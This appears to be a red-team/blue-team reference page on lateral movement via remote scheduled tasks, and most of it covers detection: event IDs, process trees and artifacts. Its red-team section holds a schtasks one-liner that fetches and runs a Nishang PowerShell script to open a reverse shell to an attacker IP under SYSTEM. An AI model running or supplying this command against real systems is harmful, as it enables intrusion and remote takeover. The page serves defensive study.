# Scheduled Tasks

## Requirement

| Subject   | Value                         |
| --------- | ----------------------------- |
| Port      | 445                           |
| Authority | Administrators, Domain Admins |
| Service   | -                             |

## <mark style="color:red;">RedTeam</mark>

### Schtasks

```powershell
# Create 'Evil' Scheduled Task on 'Wakanda-WrkStn' host with 'marvel\panther' account and 'WakandaForever!' password to execute reverse shell (powershell) to connect back to the attacker host (IP:10.0.77.1, Port:8888)
schtasks /create /SC Weekly /RU "NT Authority\SYSTEM" /TN "Evil" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1''');Invoke-PowerShellTcp -Reverse -IPAddress 10.0.77.1 -Port 8888'" /S Wakanda-WrkStn /u marvel\panther /p WakandaForever!

# Force to run 'Evil' Scheduled Task
schtasks /Run /TN "Evil" /S Wakanda-WrkStn /u marvel\panther /p WakandaForever!
```

## <mark style="color:blue;">BlueTeam</mark>

### Process tree (target host)

* svchost.exe <mark style="color:blue;">(</mark>-k netsvcs -p)
  * powershell.exe

### Event Logs (source host)

| Source        | Event ID                                               | Condition                                                                                                                 | Focus On                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| ------------- | ------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Security.evtx | 4648: A logon was attempted using explicit credentials | <p>Process Target Server\Additional Information == host*<br>AND <br>Process Information\Process Name == *schtasks.exe</p> | <p><strong>Target IP</strong><br><strong></strong>(Network Information\Network Address)<br><br><strong>Target Server Name</strong><br><strong></strong>(Target Server\Target Server Name)</p>                                                                                                                                                                                                                                                                                                                        |
| Security.evtx | 4688: A new process has been created                   | Process Information\New Process Name == \*schtasks.exe AND Process Information\Process Command Line == \*/s \*            | <p><strong>Parent Process ID</strong><br><strong></strong>(Process Information\Creator Process ID)<br><br><strong>Parent Process</strong><br><strong></strong>(Process Information\Creator Process Name)<br><br><strong>Process ID</strong><br><strong></strong>(Process Information\New Process ID)<br><br><strong>Process Name</strong><br><strong></strong>(Process Information\New Process Name)<br><br><strong>Process Command Line</strong><br><strong></strong>(Process Information\Process Command Line)</p> |

### Event Logs (target host)

| Source                                            | Event ID                                    | Condition                             | Focus On                                                                                                                                                                                                                                                  |
| ------------------------------------------------- | ------------------------------------------- | ------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Security.evtx                                     | 4624: An account was successfully logged on | Logon Type == 3                       | <p><strong>Source IP</strong><br><strong></strong>(Network Information\Source Network Address)<br><br><strong>Account Domain</strong><br><strong></strong>(New Logon\Account Domain)<br><br><strong>Account Name</strong><br>(New Logon\Account Name)</p> |
| Security.evtx                                     | 4688: A new process has been created        | Creator Process Name == \*svchost.exe | <p><strong>Process Name</strong><br><strong></strong>(Process Information\New Process Name Process)<br><br><strong>Command Line</strong><br><strong></strong>(Information\Process Command Line)</p>                                                       |
| Security.evtx                                     | 4698: A scheduled task was created          | -                                     | <p><strong>Account Domain</strong><br><strong></strong>(Subject\Account Domain)<br><br><strong>Account Name</strong><br><strong></strong>(Subject\Account Name)<br><br><strong>Tasks Information</strong><br>(Task Information\Task Content)</p>          |
| Security.evtx                                     | 4702: A scheduled task was updated          | -                                     | <p><strong>Account Domain</strong><br><strong></strong>(Subject\Account Domain)<br><br><strong>Account Name</strong><br><strong></strong>(Subject\Account Name)<br><br><strong>Tasks Information</strong><br>(Task Information\Task Content)</p>          |
| Security.evtx                                     | 4699: A scheduled task was deleted          | -                                     | <p><strong>Account Domain</strong><br><strong></strong>(Subject\Account Domain)<br><br><strong>Account Name</strong><br><strong></strong>(Subject\Account Name)<br><br><strong>Tasks Information</strong><br>(Task Information\Task Content)</p>          |
| Microsoft-Windows-TaskScheduler%4Operational.evtx | 106: A scheduled task was created           | -                                     | All                                                                                                                                                                                                                                                       |
| Microsoft-Windows-TaskScheduler%4Operational.evtx | 140: A scheduled task was updated           | -                                     | All                                                                                                                                                                                                                                                       |
| Microsoft-Windows-TaskScheduler%4Operational.evtx | 141: A scheduled task was deleted           | -                                     | All                                                                                                                                                                                                                                                       |
| Microsoft-Windows-TaskScheduler%4Operational.evtx | 200/201: A scheduled task executed          | -                                     | All                                                                                                                                                                                                                                                       |

### Artifacts

| Type     | Location                                                                                            |
| -------- | --------------------------------------------------------------------------------------------------- |
| File     | C:\Windows\System32\Tasks                                                                           |
| Registry | Computer\HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks |
| Registry | Computer\HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree  |
